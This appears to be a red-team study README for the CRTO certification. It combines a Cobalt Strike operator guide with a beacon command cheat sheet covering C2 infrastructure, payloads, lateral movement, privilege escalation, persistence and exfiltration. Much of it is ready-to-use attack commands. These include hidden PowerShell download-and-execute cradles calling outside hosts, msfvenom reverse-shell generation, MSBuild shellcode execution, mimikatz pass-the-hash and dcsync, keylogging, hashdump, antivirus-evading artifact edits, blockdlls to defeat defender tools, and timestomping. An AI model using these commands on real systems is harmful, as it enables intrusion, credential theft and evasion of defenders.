# CRTO
Certified Red Team Operator

* Course Introduction
* Command & Control
* External Reconnaissance
* Initial Compromise
* Host Reconnaissance
* Host Persistence
* Host Privilege Escalation
* Domain Reconnaissance
* Lateral Movement
* Credentials & User Impersonation
* Password Cracking Tips & Tricks
* Session Passing
* Pivoting
* Data Protection API
* Kerberos
* Active Directory Certificate Services
* Group Policy
* Discretionary Access Control Lists
* MS SQL Servers
* Domain Dominance
* Forest & Domain Trusts
* Local Administrator Password Solution
* Bypassing Defences
* Data Hunting & Exfiltration
* Post-Engagement & Reporting
* Extending Cobalt Strike


<p align="center">
  <img width="300" height="300" src="https://github.com/h3ll0clar1c3/CRTO/blob/main/CRTO.png">
</p>


# Cobalt Strike

> Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.


```powershell
$ sudo apt-get update
$ sudo apt-get install openjdk-11-jdk
$ sudo apt install proxychains socat
$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
$ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
$ ./cobaltstrike

$ powershell.exe -nop -w hidden -c "IEX (IWR http://campaigns.example.com/download/dnsback)" 
```

## Summary

* [Infrastructure](#infrastructure)
    * [Redirectors](#redirectors)
    * [Domain fronting](#domain-fronting)
* [OpSec](#opsec)
    * [Customer ID](#customer-id)
* [Payloads](#payloads)
    * [DNS Beacon](#dns-beacon)
    * [SMB Beacon](#smb-beacon)
    * [Metasploit compatibility](#metasploit-compatibility)
    * [Custom Payloads](#custom-payloads)
* [Malleable C2](#malleable-c2)
* [Files](#files)
* [Powershell and .NET](#powershell-and-net)
    * [Powershell commabds](#powershell-commands)
    * [.NET remote execution](#net-remote-execution)
* [Lateral Movement](#lateral-movement)
* [VPN & Pivots](#vpn--pivots)
* [Kits](#kits)
    * [Elevate Kit](#elevate-kit)
    * [Persistence Kit](#persistence-kit)
    * [Resource Kit](#resource-kit)
    * [Artifact Kit](#artifact-kit)
    * [Mimikatz Kit](#mimikatz-kit)
* [Beacon Object Files](#beacon-object-files)
* [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
* [References](#references)


## Infrastructure

### Redirectors

```powershell
sudo apt install socat
socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
```

### Domain Fronting

* New Listener > HTTP Host Header
* Choose a domain in "Finance & Healthcare" sector 

## OpSec

**Don't**
* Use default self-signed HTTPS certificate
* Use default port (50050)
* Use 0.0.0.0 DNS response
* Metasploit compatibility, ask for a payload : `wget -U "Internet Explorer" http://127.0.0.1/vl6D`

**Do**
* Use a redirector (Apache, CDN, ...)
* Firewall to only accept HTTP/S from the redirectors
* Firewall 50050 and access via SSH tunnel
* Edit default HTTP 404 page and Content type: text/plain
* No staging `set hosts_stage` to `false` in Malleable C2
* Use Malleable Profile to taylor your attack to specific actors

### Customer ID

> The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike.

* The Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later.
* The trial has a Customer ID value of 0. 
* Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool

## Payloads

### DNS Beacon

* Edit the Zone File for the domain
* Create an A record for Cobalt Strike system
* Create an NS record that points to FQDN of your Cobalt Strike system

Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record.

* nslookup jibberish.beacon polling.campaigns.domain.com
* nslookup jibberish.beacon campaigns.domain.com

Example of DNS on Digital Ocean:

```powershell
NS  example.com                     directs to 10.10.10.10.            86400
NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
A	campaigns.example.com           directs to 10.10.10.10	            3600 
```

```powershell
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 8.8.8.8" >  /etc/resolv.conf
echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
```

Configuration:
1. **host**: campaigns.domain.com
2. **beacon**: polling.campaigns.domain.com
3. Interact with a beacon, and `sleep 0`


### SMB Beacon   

```powershell
link [host] [pipename]
connect [host] [port]
unlink [host] [PID]
jump [exec] [host] [pipe]
```

SMB Beacon uses Named Pipes. You might encounter these error code while running it.

| Error Code | Meaning              | Description                                        |
|------------|----------------------|----------------------------------------------------|
| 2          | File Not Found       | There is no beacon for you to link to              |
| 5          | Access is denied     | Invalid credentials or you don't have permission   |
| 53         | Bad Netpath          | You have no trust relationship with the target system. It may or may not be a beacon there. |


### SSH Beacon

```powershell
# deploy a beacon
beacon> help ssh
Use: ssh [target:port] [user] [pass]
Spawn an SSH client and attempt to login to the specified target

beacon> help ssh-key
Use: ssh [target:port] [user] [/path/to/key.pem]
Spawn an SSH client and attempt to login to the specified target

# beacon's commands
upload                    Upload a file
download                  Download a file
socks                     Start SOCKS4a server to relay traffic
sudo                      Run a command via sudo
rportfwd                  Setup a reverse port forward
shell                     Execute a command via the shell
```

### Metasploit compatibility

* Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https
* Set LHOST and LPORT to the beacon
* Set DisablePayloadHandler to True
* Set PrependMigrate to True
* exploit -j

### Custom Payloads

https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c

```powershell
* Attacks > Packages > Payload Generator 
* Attacks > Packages > Scripted Web Delivery (S)
$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
```

## Malleable C2

List of Malleable Profiles hosted on Github
* Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles
* Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2
* Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles
* SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint

Example of syntax

```powershell
set useragent "SOME AGENT"; # GOOD
set useragent 'SOME AGENT'; # BAD
prepend "This is an example;";

# Escape Double quotes
append "here is \"some\" stuff";
# Escape Backslashes
append "more \\ stuff";
# Some special characters do not need escaping
prepend "!@#$%^&*()";
```

Check a profile with `./c2lint`.
* A result of 0 is returned if c2lint completes with no errors
* A result of 1 is returned if c2lint completes with only warnings
* A result of 2 is returned if c2lint completes with only errors
* A result of 3 is returned if c2lint completes with both errors and warning

## Files

```powershell
# List the file on the specified directory
beacon > ls <C:\Path>

# Change into the specified working directory
beacon > cd [directory]

# Delete a file\folder
beacon > rm [file\folder]

# File copy
beacon > cp [src] [dest]

# Download a file from the path on the Beacon host
beacon > download [C:\filePath]

# Lists downloads in progress
beacon > downloads

# Cancel a download currently in progress
beacon > cancel [*file*]

# Upload a file from the attacker to the current Beacon host
beacon > upload [/path/to/file]
```

## Powershell and .NET

### Powershell commands

```powershell
# Import a Powershell .ps1 script from the control server and save it in memory in Beacon
beacon > powershell-import [/path/to/script.ps1]

# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.
beacon > powershell [commandlet][arguments]

# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto
beacon > powerpick [commandlet] [argument]

# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
beacon > psinject [pid][arch] [commandlet] [arguments]
```

### .NET remote execution

Run a local .NET executable as a Beacon post-exploitation job. 

Require:
* Binaries compiled with the "Any CPU" configuration.

```powershell
beacon > execute-assembly [/path/to/script.exe] [arguments]
beacon > execute-assembly /home/audit/Rubeus.exe
[*] Tasked beacon to run .NET program: Rubeus.exe
[+] host called home, sent: 318507 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 
```

## Lateral Movement

:warning: OPSEC Advice: Use the **spawnto** command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe 

- **portscan:** Performs a portscan on a spesific target.
- **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
- **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
:exclamation: This module needs Administrator privileges.
- **steal_token:** Steal a token from a specified process.
- **make_token:** By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
- **jump:** Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \
:exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target. \
:muscle: We can combine the **jump** module with the **make_token** or **pth** module for a quick "jump" to another target on the network.
- **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi. \
:exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
- **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts.

:warning: All the commands launch powershell.exe

```powershell
Beacon Remote Exploits
======================
jump [module] [target] [listener] 

    psexec	x86	Use a service to run a Service EXE artifact
    psexec64	x64	Use a service to run a Service EXE artifact
    psexec_psh	x86	Use a service to run a PowerShell one-liner
    winrm	x86	Run a PowerShell script via WinRM
    winrm64	x64	Run a PowerShell script via WinRM

Beacon Remote Execute Methods
=============================
remote-exec [module] [target] [command] 

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI (PowerShell)

```

Opsec safe Pass-the-Hash:
1. `mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
2. `steal_token PID`

### Assume Control of Artifact

* Use `link` to connect to SMB Beacon
* Use `connect` to connect to TCP Beacon


## VPN & Pivots

:warning: Covert VPN doesn't work with W10, and requires Administrator access to deploy.

> Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.

```powershell
# Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.
beacon > socks [PORT]

# Proxy browser traffic through a specified Internet Explorer process.
beacon > browserpivot [pid] [x86|x64]

# Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.
beacon > rportfwd [bind port] [forward host] [forward port]

# spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin

# spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller
# then you can handle the connect back on your MSF multi handler
beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
```

## Kits

* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike

### Elevate Kit

UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)

```powershell
beacon> runasadmin

Beacon Command Elevators
========================

    Exploit                         Description
    -------                         -----------
    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
    svc-exe                         Get SYSTEM via an executable run as a service
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication
```

### Persistence Kit

* https://github.com/0xthirteen/MoveKit
* https://github.com/fireeye/SharPersist
    ```powershell
    # List persistences
    SharPersist -t schtaskbackdoor -m list
    SharPersist -t startupfolder -m list
    SharPersist -t schtask -m list

    # Add a persistence
    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
    SharPersist -t schtaskbackdoor -n "Something Cool" -m remove

    SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
    SharPersist -t service -n "Some Service" -m remove

    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
    SharPersist -t schtask -n "Some Task" -m remove
    ```

### Resource Kit

> The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows

### Artifact Kit

> Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder.

Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :

- Download the artifact kit : `Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)`
- Install the dependencies : `sudo apt-get install mingw-w64`
- Edit the Artifact code
    * Change pipename strings
    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
    * Change Import
- Build the Artifact
- Cobalt Strike -> Script Manager > Load .cna

### Mimikatz Kit

* Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)
* Load the mimikatz.cna aggressor script
* Use mimikatz functions as normal

### Sleep Mask Kit

> The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.

Use the included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.


## Beacon Object Files

> A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs

Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h

* Compile
    ```ps1
    # To compile this with Visual Studio:
    cl.exe /c /GS- hello.c /Fohello.o

    # To compile this with x86 MinGW:
    i686-w64-mingw32-gcc -c hello.c -o hello.o

    # To compile this with x64 MinGW:
    x86_64-w64-mingw32-gcc -c hello.c -o hello.o
    ```
* Execute: `inline-execute /path/to/hello.o`

## NTLM Relaying via Cobalt Strike

```powershell
beacon> socks 1080
kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
beacon> rportfwd_local 8445 <IP_KALI> 445
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445
```

## References

* [Red Team Ops with Cobalt Strike (1 of 9): Operations](https://www.youtube.com/watch?v=q7VQeK533zI)
* [Red Team Ops with Cobalt Strike (2 of 9): Infrastructure](https://www.youtube.com/watch?v=5gwEMocFkc0)
* [Red Team Ops with Cobalt Strike (3 of 9): C2](https://www.youtube.com/watch?v=Z8n9bIPAIao)
* [Red Team Ops with Cobalt Strike (4 of 9): Weaponization](https://www.youtube.com/watch?v=H0_CKdwbMRk)
* [Red Team Ops with Cobalt Strike (5 of 9): Initial Access](https://www.youtube.com/watch?v=bYt85zm4YT8)
* [Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation](https://www.youtube.com/watch?v=Pb6yvcB2aYw)
* [Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation](https://www.youtube.com/watch?v=lzwwVwmG0io)
* [Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement](https://www.youtube.com/watch?v=QF_6zFLmLn0)
* [Red Team Ops with Cobalt Strike (9 of 9): Pivoting](https://www.youtube.com/watch?v=sP1HgUu7duU&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&index=10&t=0s)
* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 ](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
* [Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019](https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/)
* [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
* [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
* [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
* [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
* [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
* [Cobalt Strike 4.5 - User Guide PDF](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf)


------------------------------------------------------------------------------------------------------------------------------------------------------


# Cobalt Strike CheatSheet

General notes and advices for cobalt strike C2 framework.

## Summary

- [Cobalt Strike CheatSheet](#cobalt-strike-notes)
  - [Summary](#summary)
  - [Basic Menu Explanation](#basic-menu-explanation)
  - [Listeners](#listeners)
  - [Malleable C2 Profiles](#malleable-c2-profiles)
  - [Aggressor Scripts](#aggressor-scripts)
  - [Common Commands](#common-commands)
  - [Exploitation](#exploitation)
  - [Privilege Escalation](#privilege-escalation)
  - [Pivoting](#pivoting)
  - [Lateral Movement](#lateral-movement)
  - [Exflitration](#exflitration)
  - [Miscellaneous](#miscellaneous)
  - [OPSEC Notes](#opsec-notes)
  
## Basic Menu Explanation

- **Cobalt Strike:** The first and most basic menu, it contains the functionality for connecting to a team server, set your preferences, change the view of beacon sessions, manage listeners and aggressor scripts.
- **View:** The view menu consists of elements that manages targets, logs, harvested credentials, screenshots, keystrokes etc. The main purpose of it is to provide an easy way to access the output of many modules, manage your loots and domain targets.
- **Attacks:** This menu contains numerous client side attack generating methods like phishing mails, website cloning and file hosting. Also provides numerous ways to generate your beacon payloads or just generate shellcode and save it for later use on another obfuscation tool.
- **Reporting:** It provides an easy way to generate pdf or spreadsheet files containing information about the execution of an attack, this way it assists you on organizing small reports, making the final report writing process easier.
- **Help:** Basic help menu of the tool.

## Listeners

### Egress Listeners

  - **HTTP/HTTPS:** The most basic payloads for beacon, by default the listeners will listen on ports 80 and 443 with always the option to set custom ports. You have the options to set proxy settings, customize the HTTP header or specify a bind port to redirect beacon's traffic if the infrastructure uses redirector servers for the payload callbacks.
  - **DNS:** A very stealthy payload options, provides stealthier traffic over the dns protocol, you need to specify the DNS server to connect to. The best situation to use this type of listener is in a really locked down environment that blocks even common traffic like port 80 and 443.

### Pivot Listeners

  - **TCP:** A basic tcp listener that bound on a specific port.
  - **SMB:** An amazing option for internal spread and lateral move, this payload uses named pipes over the smb protocol and is the best approach to bypass firewalls when even default ports like 80 and 443 are black listed.

### Miscellaneous Listeners

  - **Foreign HTTP/HTTPS:** These type of listeners give us the option to pass a session from the metasploit framework to cobalt strike using either http or https payloads. A useful example is to execute an exploit module from metasploit and gain a beacon session on cobalt strike.
  - **External C2:** This is a special type of listener that gives the option to 3rd party applications to act as a communication medium for beacon.

## Malleable C2 Profiles
  In simple words a malleable c2 profile is a configuration file that defines how beacon will communicate and behave when executes    modules, spawns processes and threads, injects dlls or touches disk and memory. Not only that, but it configures how the payload's traffic will look like on a pcap, the communication interval and jitter etc.
  
  The big advantage of custom malleable c2 profiles, is that we can configure and customize our payload to match our situation and target environment, that way we make our selves more stealthy as we can blend with the environment's traffic.
  
## Aggressor Scripts
  Aggressor Script is the scripting language built into Cobalt Strike, version 3.0, and later. Aggresor Script allows you to modify and extend the Cobalt Strike client. These scripts can add additional functions on existing modules or create new ones. \
  [Aggressor Script Tutorial](https://download.cobaltstrike.com/aggressor-script/index.html)
  
## Common Commands
  - **help:** Listing of the available commands.
  - **help \<module>:** Show the help menu of the selected module.
  - **jobs:** List the running jobs of beacon.
  - **jobkill \<id>:** Kill selected job.
  - **run:** Execute OS commands using Win32 API calls.  
  - **shell:** Execute OS commands by spawning "cmd.exe /c".
  - **powershell:** Execute commands by spawning "powershell.exe"
  - **powershell-import:** Import a local powershell module in the current beacon process.
  - **powerpick:** Execute powershell commands without spawning "powershell.exe", using only .net libraries and assemblies. (Bypasses AMSI and CLM)
  - **drives:** List current system drives.
  - **getuid:** Get current user uid.
  - **sleep:** Set the interval and jitter of beacon's call back.
  - **sleep Usage:**
  ```
  sleep [time in seconds] [jitter]
  ```
  i.e.
  ```
  sleep 5 60
  sleep 120 40
  ...
  ```
  - **ps:** Listing processes.
  - **cd:** Change directory.
  - **cp:** Copy a local file on another local location.
  - **download/upload:** Download a file and upload a local file.
  - **download/upload Usage:**
  ```
  download C:\Users\victim\Documents\passwords.csv
  upload C:\Users\S1ckB0y1337\NotMalware\youvebeenhacked.txt
  ```
  - **cancel:** Cancel a file download.
  - **reg:** Query Registry.
  
  
## Exploitation
  - **browserpivot:** Will hijack a web session of internet explorer and make possible for us to browse the web as the victim's browser, including it's sessions, cookies and saved passwords.
  - **dcsync:** Perform the DCsync attack using mimikatz.
  - **dcsync Usage:**
  ```
  dcsync [DOMAIN.fqdn] [DOMAIN\user]
  ```
  i.e.
  ```
  dcsync CORP.local CORP\steve.johnson
  ```
  - **desktop:** Inject a VNC server on the beacon process and get a remote desktop view of the target.
  - **desktop Usage:**
  ```
  desktop [pid] [x86|x64] [high|low]
  ```
  i.e.
  ```
  desktop 592 x64 high
  desktop 8841 x86 low
  ```
  :exclamation: The high/low arguments specify the quality of the session.
  - **dllinject/dllload:** Inject a reflective dll into a process/Load a dll on current process.
  - **execute-assembly:** Loads and executes a .NET compiled assembly executable completely on memory.
  - **execute-assembly Usage:**
  ```
  execute-assembly [/path/to/local/.NET] [arguments]
  ```
  - **inject:** Inject a beacon payload on a specified process and spawn a new beacon session under it's security context.
  - **inject Usage:**
  ```
  inject [pid] [x86|x64] [listener]
  ```
  i.e.
  ```
  inject 9942 x64 Lab-SMB
  inject 429 x86 Lab-HTTPS
  ...
  ```
  - **kerberos\*:** Manipulate kerberos tickets.
  - **ppid:** Spoofs the parent process of beacon for any post-exploitation child spawning job. That way we can hide our malicious post-exploitation jobs.
  - **psinject:** Inject on a specified process and execute a command using powerpick's functionality. \
  :notebook: Powershell modules imported with **powershell-import** are available.
  - **runu:** Run a command under a spoofed process PID.
  - **shinject:** Inject shellcode into another a running process.
  - **shspawn:** Create a new process and inject shellcode into it.
  - **shspawn Usage:**
  ```
  shspawn [x86|x64] [/path/to/my.bin]
  ```
  i.e.
  ```
  shspawn x64 /opt/shellcode/malicious.bin
  ```
  
  ## Privilege Escalation
  - **elevate:** Contains numerous ways to escalate your privileges to Administrator or SYSTEM using kernel exploits and UAC bypasses.
  - **elevate Usage:**
  ```
  elevate [exploit] [listener]
  ```
  i.e.
  ```
  elevate juicypotato Lab-SMB
  elevate ms16-032 Lab-HTTPS
  ...
  ```
  - **getsystem:** Attempts to impersonate system, if it fails we can use steal_token to steal a token from a process that runs as SYSTEM.
  - **getprivs:** Same as metasploit's function, enables all the available privileges on the current token. 
  - **runasadmin:** Attempts to run a command on an elevated context of Administrator or SYSTEM using a local kernel or UAC bypass exploit. The difference with elevate is that it doesnt spawn a new beacon, but executes a specified application of our choice under the new context.
  - **runasadmin Usage:**
  ```
  runasadmin [exploit] [command] [args]
  ```
  i.e.
  
  ```
  runasadmin uac-token-duplication [command]
  runasadmin uac-cmstplua [command] 
  ```
  ## Pivoting
  - **socks:** Start a socks4a proxy server and listen on a specified port. Access through the proxy server can achieved using a proxy client like proxychains or redsocks.
  - **socks Usage:**
  ```
  socks [port]
  ```
  i.e.
  ```
  socks 9050
  ```
  :exclamation: This requires your /etc/proxychains.conf to be configured to match the port specified. If operating on Windows, your proxychains.conf file may be located in %USERPROFILE%\.proxychains\proxychains.conf, (SYSCONFDIR)/proxychains.conf, or (Global programdata dir)\Proxychains\proxychains.conf.
  - **covertvpn:** Deploy a VPN on the current system, will create a new interface and merge it into a specified IP. Using this we can use a local interface to access the internal target network like we would do if we had a real connection through a router.
  
  ## Lateral Movement
  - **portscan:** Performs a portscan on a specific target.
  - **portscan Usage:**
  ```
  portscan [ip or ip range] [ports]
  ```
  i.e.
  ```
  portscan 172.16.48.0/24 1-2048,3000,8080
  ```
  The above command will scan the entire 172.16.48.0/24 subnet on ports 1 to 2048, 3000 and 8080. This can be utilized for single IPs as well.
  - **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
  - **runas Usage:**
  ```
  runas [DOMAIN\user] [password] [command] [arguments]
  ```
  i.e.
  ```
  runas CORP\Administrator securePassword12! Powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.90:80/filename'))"
  ```
  - **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
  :exclamation: This module needs Administrator privileges.
  - **pth Usage:**
  ```
  pth [DOMAIN\user] [hash]
  ```
  ```
  pth Administrator 97fc053bc0b23588798277b22540c40d
  pth CORP\Administrator 97fc053bc0b23588798277b22540c40d
  ```
  - **steal_token:** Steal a token from a specified process.
  - **make_token:** By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
  - **jump:** Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \
  :exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target. \
  :muscle: We can combine the **jump** module with the **make_token** or **pth** module for a quick "jump" to another target on the network.
  - **jump Usage:**
  ```
  jump [psexec64,psexec,psexec_psh,winrm64,winrm] [server/workstation] [listener]
  ```
  i.e.
  ```
  jump psexec64 DC01 Lab-HTTPS
  jump winrm WS04 Lab-SMB
  jump psexec_psh WS01 Lab-DNS
  ...
  ```
  - **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi. \
  :exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
  - **remote-exec Usage:**
  ```
  remote-exec [method] [target] [command]
  ```
  - **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts. It gives you basic ssh functionality with some additional post exploitation modules.
  
  ## Exflitration
  - **hashdump:** Dump the local SAM hive's NTLM hashes. This only dumps local machine user credentials.
  - **keylogger:** Will capture keystrokes of a specified process and save them on a database.
  - **keylogger Usage:**
  ```
  keylogger [pid] [x86|x64]
  ```
  i.e.
  ```
  keylogger 8932 x64
  keylogger
  ...
  ```
  This command can also be used without specifying arguments to spawn a temporary process and inject the keystroke logger into it.
  - **screenshot:** Will capture the screen of a current process and save it on the database.
  - **screenshot Usage:**
  ```
  screenshot [pid] [x86|x64] [run time in seconds]
  ```
  i.e.
  ```
  screenshot 1042 x64 15
  screenshot 773 x86 5
  ```
  - **logonpassword:** Executes the well know **logonpasswords** function of mimikatz on the current machine. This function of course uses process injection so isn't OPSEC safe, use it with precaution.
  - **mimikatz:** You can execute any function of mimikatz, mimikatz driver functionality is not included.

  ## Miscellaneous
   - **spawn:** Spawn a new beacon on the current machine, you can choose any type of listener you want.
   - **spawn Usage:**
   ```
   spawn [x86|x64] [listener]
   ```
   i.e.
   ```
   spawn x64 Lab-HTTPS
   spawn x86 Lab-SMB
   ...
   ```
   - **spawnas:** Spawn a new beacon on the current machine as another user by providing credentials.
   - **spawnas Usage:**
   ```
   spawnas [DOMAIN\user] [password] [listener]
   ```
   i.e.
   ```
   spawnas CORP\bob.smith baseBall1942 Lab-SMB
   spawnas Administrator SuperS3cRetPaSsw0rD Lab-HTTPS
   ...
   ```
   - **spawnto:** Sets the executable that beacon will use to spawn and inject shellcode into it for it's post-exploitation functionality. You must specify a full path to the executable.
   ```
   spawnto [x86|x64] [c:\path\to\whatever.exe] 
   ```
   i.e.
   ```
   spawnto x64 c:\programdata\beacon.exe
   spawnto x86 c:\users\S1ckB0y1337\NotMalware\s1ck.exe
   ```
   - **spawnu:** Attempt to spawn a session with a spoofer PID as its parent, the context of the process will match the identity of the specified PID.
   ```
   spawnu [pid] [listener]
   ```
   i.e.
   ```
   spawnu 812 Lab-SMB
   spawnu 9531 Lab-DNS
   ...
   ```
   - **argue:** Will mask/spoof the arguments of a malicious command of our choice with legitimate ones.
   - **blockdlls:** This module will create and set a custom policy on beacon's child processes that will block the injection of any 3rd party dll that is not signed by microsoft, that way we can block any blue team tool that uses dll injection to inspect and kill malicious processes and actions.
   - **blockdlls Usage:**
   ```   
   blockdlls [start|stop]
   ``` 
   - **timestomp:** Tamper the timestamp of a file, by applying another file's timestamp.
   - **timestomp Usage:**
  ```
  timestomp [fileA] [fileB]
  ```
  i.e.
  ```
  timestomp C:\Users\S1ckB0y1337\Desktop\logins.xlsx C:\Users\S1ckB0y1337\Desktop\notmalicious.xlsx
  ```
## OPSEC Notes
